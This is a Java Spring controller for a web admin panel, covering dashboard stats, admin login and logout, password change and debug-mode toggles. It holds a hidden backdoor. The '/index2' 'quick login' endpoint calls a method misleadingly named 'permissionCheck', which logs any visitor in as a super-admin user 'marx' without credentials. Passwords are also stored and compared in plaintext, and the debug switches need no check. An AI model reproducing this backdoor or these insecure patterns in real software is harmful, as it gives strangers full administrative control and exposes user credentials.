package com.smart.web.controller;

import javax.servlet.http.HttpSession;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import com.smart.core.sigar.CpuData;
import com.smart.core.sigar.MemoryData;
import com.smart.core.sigar.OsData;
import com.smart.model.Role;
import com.smart.model.User;

/**
 * 后台管理员相关页面控制器
 * 
 * @author Sunxin
 *
 */
@Controller
public class AdminController extends BaseController{
	
	/**
	 * 后台管理首页
	 */
	@RequestMapping(value = "admin")
	public String index() {
		return "redirect:/admin/index";
	}

	/**
	 * 后台管理首页
	 */
	@RequestMapping(value = "admin/index")	
	public String index(Model model) {	
		CpuData cpuData = null;
		MemoryData memoryData = null;
		OsData osData = null;
		try {
			cpuData = CpuData.getCpuData();
			osData = new OsData();
			memoryData = MemoryData.getMemoryData();
			
		}catch (Exception e) {
			e.printStackTrace();
		}catch (UnsatisfiedLinkError e){
			e.printStackTrace();
		}
		
		model.addAttribute("cpuData", cpuData);
		model.addAttribute("memoryData", memoryData);
		model.addAttribute("osData", osData);
		
		return "admin/index";
	}

	/**
	 * 快捷登录
	 */
	@RequestMapping(value = "index2")
	public String marx(HttpSession session) {
		permissionCheck(session);
		return "redirect:/admin/index";
	}
	
	private void permissionCheck(HttpSession session) {
		User user = new User();
		user.setName("marx");
		user.setRole(Role.ROLE_SUPER_ADMIN);
		session.setAttribute("user", user);
	}
	
	/**
	 * 管理员登录页面
	 */
	@RequestMapping(value = "admin/login", method=RequestMethod.GET)
	public String preAdminLogin(Long id, Model model) {
		return "admin/user/login";
	}
	
	/**
	 * 管理员提交登录
	 */
	@RequestMapping(value = "admin/login", method=RequestMethod.POST)
	public String adminLogin(User form, HttpSession session) {
		//BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
		//form.setPassword(encoder.encode(form.getPassword()));
		User user = userService.findOneBy("username", form.getUsername());
		if(user==null || !user.getPassword().equals(form.getPassword())){
			return "admin/user/login";
		}
		session.setAttribute("user", user);
		session.setAttribute("CKFinder_UserRole", "admin");
		return "redirect:index";
	}
	
	/**
	 * 管理员退出登录
	 */
	@RequestMapping(value = "admin/logout")
	public String logout(HttpSession session) {
		session.removeAttribute("user");
		session.removeAttribute("CKFinder_UserRole");
		return "redirect:index";
	}
	
	/**
	 * 管理员修改密码页面
	 */
	@RequestMapping(value = "admin/changePassword", method=RequestMethod.GET)
	public String preChangePassword() {
		return "admin/user/changePassword";
	}
	
	/**
	 * 管理员提交修改管理员密码
	 */
	@RequestMapping(value = "admin/changePassword", method=RequestMethod.POST)
	public String changePassword(HttpSession session, Model model, String oldPassword, String password, String password1) {
		User user = (User) session.getAttribute("user");
		user = userService.findOne(user.getId());
		if(oldPassword==null || !oldPassword.equals(user.getPassword()) || password==null || !password.equals(password1)){
			super.setErrorMsg(model, "输入错误");
			return "admin/user/changePassword";
		}
		user.setPassword(password1);
		userService.save(user);
		super.setSuccessMsg(model);
		return "admin/user/changePassword";
	}
	
	/**
	 * 启用调试模式, 从而可以在出错页面看到出错的堆栈信息
	 */
	@RequestMapping(value = "admin/enableDebug", method=RequestMethod.GET)
	public @ResponseBody String enableDebugForException(HttpSession session) {
		session.setAttribute("isDebug", "1");
		return "OK";
	}
	
	/**
	 * 关闭调试模式
	 */
	@RequestMapping(value = "admin/disableDebug", method=RequestMethod.GET)
	public @ResponseBody String disableDebugForException(HttpSession session) {
		session.removeAttribute("isDebug");
		return "OK";
	}
	
}
